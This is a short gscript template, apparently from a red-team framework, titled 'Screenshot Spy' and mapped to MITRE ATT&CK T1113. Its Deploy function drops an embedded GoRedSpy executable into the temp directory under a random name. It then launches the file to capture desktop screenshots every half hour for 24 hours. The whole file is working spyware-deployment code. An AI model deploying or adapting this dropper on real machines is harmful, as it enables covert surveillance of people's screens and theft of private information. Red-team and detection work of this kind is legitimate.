// Example gscript template
// Title: Screenshot Spy
// Author: ahhh
// Purpose: Takes screenshots of the desktop every halfhour for the next 24 hours (48 x 1800)
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1113
// Using GoRedSpy to take screenshots: https://github.com/ahhh/GoRedSpy

//priority:150
//timeout:150
//import:/private/tmp/GoRedSpy.exe
//go_import:os as os
  
  function Deploy() {  
    console.log("Starting GoRedSpy");

    // Prep the sample
    var spy = GetAssetAsBytes("GoRedSpy.exe");
    var temppath = os.TempDir();
    var naming = G.rand.GetAlphaString(5);
    naming = naming.toLowerCase();
    var fullpath = temppath+"\\"+naming+".exe";

    // Drop the sample
    console.log("file name: "+ fullpath);
    errors = G.file.WriteFileFromBytes(fullpath, spy[0]);
    console.log("errors: "+errors);
      
    // Run the sample
    var running = G.exec.ExecuteCommandAsync(fullpath, ["-outDir", temppath, "-count", "48", "-delay", "1800s"]);
    console.log("errors running: "+running[1]);

    console.log("Done GoRedSpy");
    return true;
  }
  